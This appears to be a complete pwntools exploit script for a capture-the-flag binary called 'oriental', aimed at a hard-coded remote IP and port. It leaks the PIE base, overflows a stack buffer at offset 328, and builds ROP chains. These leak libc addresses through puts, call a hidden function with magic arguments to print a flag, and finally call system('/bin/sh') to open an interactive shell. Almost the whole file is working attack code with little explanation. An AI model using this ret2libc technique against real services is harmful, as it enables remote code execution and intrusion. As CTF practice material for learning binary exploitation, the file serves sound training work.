#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 0.0.0.0 --port 1000 oriental
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "oriental_patched")
libc = ELF("libc.so.6")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
# nc 103.145.226.206 20022
host = args.HOST or "103.145.226.206"
port = int(args.PORT or 20022)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
init-peda

b *showShops+509
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

##### leak pie
p = b"2"
io.sendlineafter(b">> ", p)
p = b"y"
io.sendlineafter(b"(y/n) ", p)
p = b"3"
io.sendlineafter(b">> ", p)

io.recvuntil(b"I spilled some ")
leak = int(io.recvline().strip(), 16)
log.success(f"leak lookAround: {hex(leak)}")
exe.address = leak - exe.sym["lookAround"]
log.success(f"pie base: {hex(exe.address)}")

##################################
p = b"1"
io.sendlineafter(b">> ", p)
p = b"FOMO"
io.sendlineafter(b">> ", p)

offset = 328

p = b"A" * offset
ROP = ROP(exe)
pop_rdi = ROP.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = ROP.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = ROP.find_gadget(["pop rdx", "ret"])[0]
pop_rcx = ROP.find_gadget(["pop rcx", "ret"])[0]
ret = ROP.find_gadget(["ret"])[0]


p += p64(pop_rdi)
p += p64(exe.got["alarm"])
p += p64(exe.plt["puts"])
p += p64(ret)
p += p64(pop_rdi)
p += p64(exe.got["__isoc99_scanf"])
p += p64(exe.plt["puts"])
p += p64(ret)

arg1 = 0xDEADD34D
arg2 = 0x1234ABCD
arg3 = 0xCA77D099
p += p64(pop_rdi) + p64(arg1)
p += p64(pop_rsi) + p64(arg2)
p += p64(pop_rdx) + p64(arg3)
p += p64(ret)
p += p64(exe.sym["underDevelopment"])

p += p64(ret)
p += p64(exe.sym["main"])


io.sendlineafter(b"iyakah?? ", p)
leak_alarm = u64(io.recvline().strip().ljust(8, b"\x00"))
log.success(f"leak_alarm   {hex(leak_alarm)}")
leak_scanf = u64(io.recvline().strip().ljust(8, b"\x00"))
log.success(f"leak_scanf   {hex(leak_scanf)}")

libc.address = leak_scanf - libc.sym["__isoc99_scanf"]
log.success(f"libc base: {hex(libc.address)}")

falg = io.recvline().strip()
log.success(falg)

p = b"1"
io.sendlineafter(b">> ", p)
p = b"FOMO"
io.sendlineafter(b">> ", p)

BINSH = next(libc.search(b"/bin/sh"))  # Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

p = b"A" * offset
p += p64(pop_rdi) + p64(BINSH) + p64(ret) + p64(SYSTEM) + p64(EXIT)
io.sendlineafter(b"iyakah?? ", p)

io.interactive()
